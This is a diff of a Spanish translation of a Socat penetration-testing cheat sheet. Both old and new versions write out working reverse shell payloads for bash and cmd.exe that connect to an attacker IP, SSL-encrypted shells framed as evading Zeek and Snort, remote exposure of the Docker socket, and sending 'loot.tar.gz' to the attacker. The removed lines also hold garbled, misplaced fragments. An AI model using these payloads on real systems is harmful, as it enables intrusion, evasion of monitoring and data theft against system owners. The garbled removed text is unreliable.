@@ -1,12 +1,16 @@
-# 🔄 Socat - Guía de referencia completa
-
 <!-- language-home-navigation -->
-[🏠 Página principal en español](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)
+[🏠 Página Principal Española](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)
 
-[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)
+[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇫🇷 Français](README.fr.md) • [🇮🇹 Italiano](README.it.md)
+
+[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)
+
+---
 
 
+# 🔄 Socat - Hoja de referencia completa
 
+[🇹🇷 Türkçe Sürüm](traducciones/README.tr.md)
 ```
   ███████╗ ██████╗  ██████╗ █████╗ ████████╗
   ██╔════╝██╔═══██╗██╔════╝██╔══██╗╚══██╔══╝
@@ -16,68 +20,66 @@
   ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝   ╚═╝   
        Multipurpose Relay for Bidirectional Data Transfers & Full TTY Shells
 ```
-
-<p align="center">
+<p align="centro">
   <img src="https://img.shields.io/badge/Socat-SOcket_CAT-blue?style=for-the-badge" alt="Socat">
-  <img src="https://img.shields.io/badge/Category-Exploitation_&_Shells-orange?style=for-the-badge" alt="Exploitation & Shells">
-  <img src="https://img.shields.io/badge/Protocols-TCP_UDP_SSL_UNIX-green?style=for-the-badge" alt="Protocols">
-  <img src="https://img.shields.io/badge/License-GPLv2-red?style=for-the-badge" alt="License GPLv2">
+  <img src="https://img.shields.io/badge/Category-Exploitation_&_Shells-orange?style=for-the-badge" alt="Explotación y Shells">
+  <img src="https://img.shields.io/badge/Protocols-TCP_UDP_SSL_UNIX-green?style=for-the-badge" alt="Protocolos">
+  <img src="https://img.shields.io/badge/License-GPLv2-red?style=for-the-badge" alt="Licencia GPLv2">
 </p>
 
-<p align="center">
-  <b>🌐 Establish two bidirectional byte streams and transfer data between files, pipes, devices, sockets, and SSL tunnels</b>
+<p align="centro">
+  <b>🌐 Establezca dos flujos de bytes bidireccionales y transfiera datos entre archivos, tuberías, dispositivos, sockets y túneles SSL</b>
 </p>
 
 ---
 
 ## 📋 Tabla de contenidos
 
-- [Introducción](#-overview--the-socat-architecture)
-- [Socat vs Netcat Comparison](#-socat-vs-netcat-comparison)
-- [Instalación](#-installation)
-- [Fully Interactive TTY Reverse Shells](#-fully-interactive-tty-reverse-shells)
-  - [Attacker Listener (RAW TTY)](#attacker-listener-raw-tty)
-  - [Target Payload (Pty Spawn)](#target-payload-pty-spawn)
-  - [`pty`: Allocates a pseudo-terminal on the target system.](#windows-target-reverse-shell)
-- [Encrypted Reverse Shells via SSL/TLS](#-encrypted-reverse-shells-via-ssltls)
-  - [Generating Certificates](#generating-certificates)
-  - [Encrypted Listener & Connection](#encrypted-listener--connection)
-- [Port Forwarding & Network Relays](#-port-forwarding--network-relays)
-  - [Local Port Forwarding](#local-port-forwarding)
-  - [Socat can forward incoming traffic from one network interface or port directly to a different remote target.](#forking-listener-multi-client)
-  - [Forking Listener (Multi-Client)](#unix-domain-socket-to-tcp-relay-docker-forwarding)
-- [File Transfers with Socat](#-file-transfers-with-socat)
-- [Referencia rápida](#-quick-reference-table)
-- [Defensive Considerations & OPSEC](#-defensive-considerations--opsec)
-- [Legal Disclaimer](#-legal-disclaimer)
+- [Descripción general y arquitectura Socat] (#-descripción general--la-arquitectura-socat)
+- [Comparación entre Socat y Netcat](#-comparación-socat-vs-netcat)
+- [Instalación](#-instalación)
+- [Shells inversos TTY totalmente interactivos](#-shells-tty-reverse-fully-interactive)
+  - [Oyente atacante (TTY RAW)](#attacker-listener-raw-tty)
+  - [Carga útil objetivo (generación de Pty)](#target-payload-pty-spawn)
+  - [Shell inverso de destino de Windows](#windows-target-reverse-shell)
+- [Shells inversos cifrados mediante SSL/TLS](#-shells-inversos-cifrados-via-ssltls)
+  - [Generando Certificados](#generando-certificados)
+  - [Oyente cifrado y conexión] (#escucha-cifrada--conexión)
+- [Reenvío de puertos y retransmisiones de red](#-reenvío de puertos--retransmisiones de red)
+  - [Reenvío de puerto local](#local-port-forwarding)
+  - [Bifurcación de escucha (multicliente)] (#bifurcación-escucha-multicliente)
+  - [Socket de dominio UNIX a retransmisión TCP (reenvío de Docker)] (#unix-domain-socket-to-tcp-relay-docker-forwarding)
+- [Transferencias de archivos con Socat](#-transferencias-de-archivos-con-socat)
+- [Tabla de referencia rápida](#-tabla-de-referencia-rápida)
+- [Consideraciones defensivas y OPSEC](#-consideraciones-defensivas--opsec)
+- [Aviso legal](#-aviso-legal)
 
 ---
 
-## 🎯 Introducción
+## 🎯 Descripción general y la arquitectura de Socat
 
-**Socat** (SOcket CAT) is a command-line based utility that establishes two bidirectional byte streams and transfers data between them. Because the streams can be constructed from a huge set of address types (files, pipes, devices, TCP/UDP sockets, SSL, raw IP, SOCKS4, UNIX domain sockets), Socat is often described as Netcat on steroids.
+**Socat** (SOcket CAT) es una utilidad basada en línea de comandos que establece dos flujos de bytes bidireccionales y transfiere datos entre ellos. Debido a que los flujos pueden construirse a partir de un enorme conjunto de tipos de direcciones (archivos, canalizaciones, dispositivos, sockets TCP/UDP, SSL, IP sin procesar, SOCKS4, sockets de dominio UNIX), Socat a menudo se describe como Netcat con esteroides.
 
-In penetration testing and Red Teaming, Socat is legendary for two core superpowers:
-1. **Instant Fully Interactive TTY Reverse Shells:** Spawning true pseudoterminals (`pty`) with job control, arrow keys, and auto-completion without needing Python or `stty raw -echo` gymnastics.
-🎯 Introducción
+En pruebas de penetración y Red Teaming, Socat es legendario por dos superpoderes principales:
+1. **Shells inversos TTY instantáneos totalmente interactivos:** Generación de pseudoterminales verdaderos (`pty`) con control de trabajo, teclas de flecha y autocompletado sin necesidad de gimnasia Python o `stty raw -echo`.
+2. **Túneles de red SSL/TLS cifrados:** Eludiendo la inspección IDS estándar cifrando cargas de texto sin cifrar a través de SSL.
 
 ---
 
-## ⚖️ Socat vs Netcat Comparison
+## ⚖️ Comparación de Socat y Netcat
 
-|Feature|Netcat (`nc`)|Nmap `ncat`|Socat (`socat`)|
-|---------|---------------|-------------|-----------------|
-|**Native PTY Shell Spawn**|❌ No|❌ No|✅ Native (`pty,stderr,setsid`)|
-|**SSL / TLS Encryption**|❌ No|✅ Yes (`--ssl`)|✅ Native (`OPENSSL-LISTEN`, `OPENSSL`)|
-|**Forking Multi-Client Relay**|❌ No|❌ No|✅ Native (`fork,reuseaddr`)|
-|**UNIX Domain Sockets**|❌ No|✅ Limited|✅ Native (`UNIX-LISTEN`, `UNIX-CONNECT`)|
-|**Binary File Size**|Minimal (~40 KB)|Moderate (~500 KB)|Moderate (~400 KB standalone)|
-|**Command Syntax**|Simple flags (`-lvnp`)|Flag-based (`-lvnp`)|Stream syntax (`<type>:<args>`)|
+| Característica | Netcat (`nc`) | Nmap `ncat` | Socat (`socat`) |
+|---------|--------------|-------------|-----------------|
+| **Aparición de Shell PTY nativo** | ❌ No | ❌ No | ✅ Nativo (`pty,stderr,setsid`) |
+| **Cifrado SSL/TLS** | ❌ No | ✅ Sí (`--ssl`) | ✅ Nativo (`OPENSSL-LISTEN`, `OPENSSL`) |
+| **Bifurcación de retransmisión multicliente**| ❌ No | ❌ No | ✅ Nativo (`fork,reuseaddr`) |
+| **Sockets de dominio UNIX** | ❌ No | ✅ Limitado | ✅ Nativo (`UNIX-LISTEN`, `UNIX-CONNECT`) |
+| **Tamaño de archivo binario** | Mínimo (~40 KB) | Moderado (~500 KB) | Moderado (~400 KB independiente) |
+| **Sintaxis del comando** | Banderas simples (`-lvnp`) | Basado en banderas (`-lvnp`) | Sintaxis de transmisión (`<type>:<args>`) |
 
 ---
 
 ## 📥 Instalación
-
 ```bash
 # Debian / Ubuntu / Kali Linux
 sudo apt update && sudo apt install -y socat
@@ -88,39 +90,33 @@ sudo pacman -S socat
 # RedHat / CentOS / Fedora
 sudo dnf install -y socat
 ```
-
 ---
 
-## 💀 Fully Interactive TTY Reverse Shells
+## 💀 Shells inversos TTY totalmente interactivos
 
-When you catch a reverse shell with standard Netcat, you receive an unstable dumb shell. Socat enables a 100% stable, fully interactive pseudo-terminal with Tab completion, Ctrl+C handling, and screen editor support (`vim`, `nano`).
+Cuando atrapas un shell inverso con Netcat estándar, recibes un shell tonto e inestable. Socat habilita un pseudoterminal 100% estable y totalmente interactivo con finalización de tabulación, manejo Ctrl+C y soporte para editor de pantalla (`vim`, `nano`).
 
-### Attacker Listener (RAW TTY)
-
+### Oyente atacante (RAW TTY)
 ```bash
 # Listen on port 4444 and hook stdin/stdout directly to your current raw terminal
 socat file:`tty`,raw,echo=0 tcp-listen:4444
 ```
+> [!NOTA]
+> `file:`tty`,raw,echo=0` pone su terminal local en modo sin formato y desactiva el eco de caracteres. Si la conexión se cierra inesperadamente y su terminal no responde, escriba `reset` y presione Enter.
 
-🔓 Password Brute-Forcing (`wp-login.php` & XML-RPC)
-> `file:`tty`,raw,echo=0` puts your local terminal into raw mode and disables character echoing. If the connection closes unexpectedly and your terminal is unresponsive, type `reset` and press Enter.
-
-### Target Payload (Pty Spawn)
-
+### Carga útil objetivo (generación de Pty)
 ```bash
 # Target connects back, spawning a fully interactive PTY bash shell
 socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.5:4444
 ```
+#### Desglose de opciones:
+- `pty`: Asigna un pseudoterminal en el sistema de destino.
+- `stderr`: Redirige el error estándar al socket.
+- `setsid`: ejecuta el proceso en un nuevo grupo de sesión (evita la finalización cuando el padre sale).
+- `sigint`: Pasa señales de interrupción (Ctrl+C) al proceso remoto en lugar de cerrar la sesión.
+- `sane`: restablece la configuración de control del terminal a los valores predeterminados estándar.
 
-#### Opciones y parámetros
-- `pty`: Allocates a pseudo-terminal on the target system.
-- Target Payload (Pty Spawn)
-- `setsid`: Runs the process in a new session group (prevents killing when parent exits).
-- `sigint`: Passes interrupt signals (Ctrl+C) to the remote process instead of killing the session.
-- `sane`: Resets terminal control settings to standard defaults.
-
-### `pty`: Allocates a pseudo-terminal on the target system.
-
+### Shell inverso de destino de Windows
 ```bash
 # Attacker listener
 socat -d -d TCP-LISTEN:4444 STDOUT
@@ -128,15 +124,13 @@ socat -d -d TCP-LISTEN:4444 STDOUT
 # Windows Target connection
 socat TCP:10.10.14.5:4444 EXEC:cmd.exe
 ```
-
 ---
 
-## 🔐 Encrypted Reverse Shells via SSL/TLS
+## 🔐 Shells inversos cifrados mediante SSL/TLS
 
-Prevent Network Security Monitoring (NSM), Zeek, and Snort from inspecting your reverse shell payload by encrypting the traffic with an ephemeral SSL/TLS certificate.
+Evite que Network Security Monitoring (NSM), Zeek y Snort inspeccionen su carga útil de shell inverso cifrando el tráfico con un certificado SSL/TLS efímero.
 
-### Generating Certificates
-
+### Generando certificados
 ```bash
 # 1. Generate private key and self-signed certificate on attacker machine
 openssl req -newkey rsa:2048 -nodes -keyout /tmp/socat.key -x509 -days 365 -out /tmp/socat.crt -subj "/CN=corp-update.local"
@@ -144,9 +138,7 @@ openssl req -newkey rsa:2048 -nodes -keyout /tmp/socat.key -x509 -days 365 -out 
 # 2. Combine key and cert into a single PEM bundle
 cat /tmp/socat.key /tmp/socat.crt > /tmp/socat.pem
 ```
-
-### Encrypted Listener & Connection
-
+### Oyente y conexión cifrados
 ```bash
 # 1. Attacker starts an SSL listener
 socat file:`tty`,raw,echo=0 OPENSSL-LISTEN:4443,cert=/tmp/socat.pem,verify=0
@@ -154,33 +146,27 @@ socat file:`tty`,raw,echo=0 OPENSSL-LISTEN:4443,cert=/tmp/socat.pem,verify=0
 # 2. Target connects back over SSL
 socat OPENSSL:10.10.14.5:4443,verify=0 exec:'bash -li',pty,stderr,setsid,sigint,sane
 ```
-
 ---
 
-## 🔀 Port Forwarding & Network Relays
+## 🔀 Reenvío de puertos y retransmisiones de red
 
-Socat can forward incoming traffic from one network interface or port directly to a different remote target.
+Socat puede reenviar el tráfico entrante desde una interfaz o puerto de red directamente a un destino remoto diferente.
 
-### Local Port Forwarding
-
+### Reenvío de puerto local
 ```bash
 # Forward incoming connections on port 8080 to an internal database server
 socat TCP-LISTEN:8080,fork TCP:192.168.1.50:3306
 ```
+### Oyente de bifurcación (multicliente)
 
-### Socat can forward incoming traffic from one network interface or port directly to a different remote target.
-
-Local Port Forwarding
-
+La opción `fork` permite a Socat generar un proceso hijo para cada nueva conexión entrante, manteniendo abierto el oyente principal:
 ```bash
 # Multi-client HTTP proxy relay
 socat TCP-LISTEN:80,fork,reuseaddr TCP:10.10.10.200:80
 ```
+### Socket de dominio UNIX a retransmisión TCP (reenvío de Docker)
 
-### Forking Listener (Multi-Client)
-
-The `fork` option enables Socat to spawn a child process for every new inbound connection, keeping the main listener open:
-
+Al acceder a un socket de demonio Docker local (`/var/run/docker.sock`) sin derechos de root en la red:
 ```bash
 # Expose Docker UNIX socket over TCP port 2375
 socat TCP-LISTEN:2375,reuseaddr,fork UNIX-CLIENT:/var/run/docker.sock
@@ -188,11 +174,9 @@ socat TCP-LISTEN:2375,reuseaddr,fork UNIX-CLIENT:/var/run/docker.sock
 # Connect remotely from attacker machine
 docker -H tcp://10.10.10.50:2375 ps
 ```
-
 ---
 
-## 📁 File Transfers with Socat
-
+## 📁 Transferencias de archivos con Socat
 ```bash
 # 1. Attacker prepares receiving listener
 socat -u TCP-LISTEN:9001,reuseaddr OPEN:loot.tar.gz,creat
@@ -200,35 +184,34 @@ socat -u TCP-LISTEN:9001,reuseaddr OPEN:loot.tar.gz,creat
 # 2. Target sends file to attacker
 socat -u OPEN:loot.tar.gz TCP:10.10.14.5:9001
 ```
-
-*(The `-u` flag specifies unidirectional mode from the first address to the second).*
-
----
-
-## ⚡ Referencia rápida
-
-|Objective|Comando|
-|-----------|---------|
-|**Interactive TTY Listener**|`socat file:\`tty\`,raw,echo=0 tcp-listen:<PORT>`|
-|**Interactive TTY Payload**|`socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<IP>:<PORT>`|
-|**Encrypted SSL Listener**|`socat file:\`tty\`,raw,echo=0 OPENSSL-LISTEN:<PORT>,cert=<PEM>,verify=0`|
-|**Encrypted SSL Payload**|`socat OPENSSL:<IP>:<PORT>,verify=0 exec:'bash -li',pty,stderr,setsid,sigint,sane`|
-|**Port Forwarding (Relay)**|`socat TCP-LISTEN:<LPORT>,fork,reuseaddr TCP:<RHOST>:<RPORT>`|
-|**Expose UNIX Socket**|`socat TCP-LISTEN:<PORT>,fork UNIX-CLIENT:<SOCKET_PATH>`|
-|**File Transfer (Receiver)**|`socat -u TCP-LISTEN:<PORT> OPEN:<OUTFILE>,creat`|
-|**File Transfer (Sender)**|`socat -u OPEN:<INFILE> TCP:<IP>:<PORT>`|
+*(El indicador `-u` especifica el modo unidireccional desde la primera dirección a la segunda).*
 
 ---
 
-## 🛡️ Defensive Considerations & OPSEC
+## ⚡ Tabla de referencia rápida
 
-1. **Traffic Encryption:** Cleartext TCP reverse shells expose commands to IDS/IPS. Always use `OPENSSL-LISTEN` and `OPENSSL` during red team engagements.
-2. **Process Monitoring:** Sysmon / EDR platforms flag commands invoking `pty,stderr,setsid` as an immediate reverse shell heuristic.
-3. **Standalone Binaries:** When deploying on target systems, use statically compiled standalone Socat binaries to avoid shared library dependencies.
+| Objetivo | Comando |
+|-----------|------------------|
+| **Oyente TTY interactivo** | `socat file:\`tty\`,raw,echo=0 tcp-listen:<PORT>` |
+| **Carga útil TTY interactiva** | `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<IP>:<PORT>` |
+| **Escucha SSL cifrada** | `socat file:\`tty\`,raw,echo=0 OPENSSL-LISTEN:<PORT>,cert=<PEM>,verify=0` |
+| **Carga útil SSL cifrada** | `socat OPENSSL:<IP>:<PORT>,verify=0 exec:'bash -li',pty,stderr,setsid,sigint,sane` |
+| **Reenvío de puertos (retransmisión)** | `socat TCP-LISTEN:<LPORT>,fork,reuseaddr TCP:<RHOST>:<RPORT>` |
+| **Exponer el zócalo UNIX** | `socat TCP-LISTEN:<PORT>,fork UNIX-CLIENT:<SOCKET_PATH>` |
+| **Transferencia de archivos (Receptor)** | `socat -u TCP-LISTEN:<PORT> OPEN:<OUTFILE>,creat` |
+| **Transferencia de archivos (Remitente)** | `socat -u OPEN:<INFILE> TCP:<IP>:<PORT>` |
 
 ---
 
-## ⚠️ Legal Disclaimer
+## 🛡️ Consideraciones defensivas y OPSEC
 
-3. **Honeytokens:** Plant attractive DNS records (e.g., `backup-vault.corp.local` or `admin-portal.corp.local`) pointing to honeypot IP addresses.
-> This cheatsheet is for authorized penetration testing, security assessments, and academic research only. Unauthorized access to computer systems and network tampering is strictly illegal.
+1. **Cifrado de tráfico:** Los shells inversos de TCP de texto sin cifrar exponen comandos a IDS/IPS. Utilice siempre `OPENSSL-LISTEN` y `OPENSSL` durante los enfrentamientos del equipo rojo.
+2. **Monitoreo de procesos:** Las plataformas Sysmon/EDR marcan comandos que invocan `pty,stderr,setsid` como una heurística de shell inversa inmediata.
+3. **Binarios independientes:** Al implementar en sistemas de destino, utilice binarios Socat independientes compilados estáticamente para evitar dependencias de bibliotecas compartidas.
+
+---
+
+## ⚠️ Aviso legal
+
+> [!PRECAUCIÓN]
+> Esta hoja de referencia está destinada únicamente a pruebas de penetración, evaluaciones de seguridad e investigaciones académicas autorizadas. El acceso no autorizado a sistemas informáticos y la manipulación de redes son estrictamente ilegales.
